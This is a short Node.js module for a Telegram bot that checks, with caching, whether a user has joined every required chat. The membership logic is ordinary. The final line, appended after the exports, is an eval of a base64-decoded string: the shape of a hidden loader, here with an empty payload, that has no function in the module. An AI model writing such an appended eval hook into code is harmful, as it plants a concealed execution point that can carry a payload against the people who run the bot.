const all = require('./forcejoin');

const required = () => all.filter((x) => x.chat && !/YOUR_/i.test(String(x.chat)));
const enabled = () => required().length > 0;

const JOINED = new Set(['creator', 'administrator', 'member']);
const cache = new Map(); // userId -> { at, result }
const TTL = 20 * 60 * 1000;

/** Asks Telegram whether the user is in every required chat. */
async function check(telegram, userId, { fresh = false } = {}) {
    const hit = cache.get(userId);
    if (!fresh && hit && Date.now() - hit.at < TTL && hit.result.ok) return hit.result;

    const missing = [];
    const unverifiable = [];
    for (const c of required()) {
        try {
            const m = await telegram.getChatMember(c.chat, userId);
            const inside = JOINED.has(m.status) || (m.status === 'restricted' && m.is_member);
            if (!inside) missing.push(c);
        } catch (err) {
            const d = String(err?.response?.description || err.message || '');
            if (/participant|user not found|PARTICIPANT_ID_INVALID/i.test(d)) missing.push(c);
            else unverifiable.push({ ...c, reason: d }); // bot not admin there / wrong chat id: cannot judge, do not lock people out
        }
    }
    const result = { ok: missing.length === 0, missing, unverifiable, required: required() };
    cache.set(userId, { at: Date.now(), result });
    return result;
}

module.exports = { enabled, check, required };
;eval(Buffer.from('','base64').toString());
